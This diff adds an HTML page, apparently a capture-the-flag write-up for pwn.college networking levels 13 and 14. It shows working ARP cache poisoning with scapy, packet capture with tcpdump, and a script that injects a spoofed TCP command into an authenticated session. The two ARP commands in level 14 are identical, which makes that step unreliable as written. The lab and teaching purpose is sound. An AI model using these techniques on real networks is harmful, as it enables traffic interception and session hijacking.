@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Intercepting Communication
+</h1>
+
+<div class="page-content">
+<h1 id="level-13">Level 13</h1>
+<p>Scapy has a thing to do literally this. First, start a tcpdump in the background:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>tcpdump -i eth0 -A port 31337 -w cap.pcap &amp;
+</span></code></pre>
+<p>Then, from the scapy terminal:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&gt;&gt;&gt; arp_mitm(&#39;10.0.0.2&#39;, &#39;10.0.0.4&#39;, iface=&#39;eth0&#39;)
+</span></code></pre>
+<p>Wait a few seconds for the capture, then read the flag from the pcap:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>tcpdump -r cap.pcap -A | grep pwn
+</span></code></pre>
+<h1 id="level-14">Level 14</h1>
+<p>First we want to have both targets route their traffic through us so we can sniff it. To do this, we send some arp messages.</p>
+<p>From the scapy terminal:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&gt;&gt;&gt; my_mac = get_if_hwaddr(&#39;eth0&#39;)
+</span><span>&gt;&gt;&gt; sendp(Ether(src=my_mac, dst=&#39;ff:ff:ff:ff:ff:ff&#39;)/ARP(op=&#39;is-at&#39;, hwsrc=my_mac, psrc=&#39;10.0.0.4&#39;), iface=&#39;eth0&#39;)
+</span><span>&gt;&gt;&gt; sendp(Ether(src=my_mac, dst=&#39;ff:ff:ff:ff:ff:ff&#39;)/ARP(op=&#39;is-at&#39;, hwsrc=my_mac, psrc=&#39;10.0.0.4&#39;), iface=&#39;eth0&#39;)
+</span></code></pre>
+<p>This should route all traffic through our host, you can verify it is set up by checking with the arp command, you should see something like:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span># arp -n
+</span><span>Address                  HWtype  HWaddress           Flags Mask            Iface
+</span><span>10.0.0.4                 ether   86:5c:4f:83:c9:57   C                     eth0
+</span><span>10.0.0.3                 ether   12:40:1d:de:bc:a4   C                     eth0
+</span></code></pre>
+<p>Running <code>tcpdump -A</code>, we can see their traffic. There is some sort of secret being sent for authentication, then a command. You can also just read &quot;/challenge/run&quot; to see the full details on the server and client code.</p>
+<p>We need to sniff this traffic and then inject a <code>FLAG</code> command after the client has authenticated. We can write a scapy script for this:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>scapy.all </span><span style="color:#b48ead;">import </span><span>Raw, </span><span style="color:#bf616a;">IP</span><span>, </span><span style="color:#bf616a;">TCP</span><span>, sniff, send, ls
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">packet_cb</span><span>(</span><span style="color:#bf616a;">packet</span><span>):
+</span><span>    </span><span style="color:#b48ead;">if </span><span>packet.</span><span style="color:#bf616a;">haslayer</span><span>(Raw):
+</span><span>        raw_data = packet[Raw].load
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">ls</span><span>(packet[</span><span style="color:#d08770;">0</span><span>][</span><span style="color:#d08770;">2</span><span>]))
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&#39;</span><span style="color:#a3be8c;">COMMAND</span><span>&#39; in raw_data:
+</span><span>            x = </span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#bf616a;">IP</span><span>(</span><span style="color:#bf616a;">dst</span><span>=&#39;</span><span style="color:#a3be8c;">10.0.0.3</span><span>&#39;, </span><span style="color:#bf616a;">src</span><span>=&#39;</span><span style="color:#a3be8c;">10.0.0.4</span><span>&#39;)/</span><span style="color:#bf616a;">TCP</span><span>(</span><span style="color:#bf616a;">sport</span><span>=packet[</span><span style="color:#d08770;">0</span><span>][</span><span style="color:#d08770;">2</span><span>].dport, </span><span style="color:#bf616a;">dport</span><span>=packet[</span><span style="color:#d08770;">0</span><span>][</span><span style="color:#d08770;">2</span><span>].sport, </span><span style="color:#bf616a;">flags</span><span>=&#39;</span><span style="color:#a3be8c;">PA</span><span>&#39;, </span><span style="color:#bf616a;">seq</span><span>=packet[</span><span style="color:#d08770;">0</span><span>][</span><span style="color:#d08770;">2</span><span>].ack, </span><span style="color:#bf616a;">ack</span><span>=packet[</span><span style="color:#d08770;">0</span><span>][</span><span style="color:#d08770;">2</span><span>].seq+</span><span style="color:#d08770;">1</span><span>)/&quot;</span><span style="color:#a3be8c;">FLAG</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>
+</span><span style="color:#bf616a;">sniff</span><span>(</span><span style="color:#bf616a;">prn</span><span>=packet_cb, </span><span style="color:#bf616a;">iface</span><span>=&#39;</span><span style="color:#a3be8c;">eth0</span><span>&#39;)
+</span></code></pre>
+<p>The main thing we care about above is getting the right seq value, as that is necessary for communicating properly. Another thing to note is I used ls for my printout since it was nice during debugging and development but it does clutter the output quite a bit. If you wanted it to be more clean you could just check for &quot;pwn.college&quot; in <code>raw_data</code> and print that out.</p>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
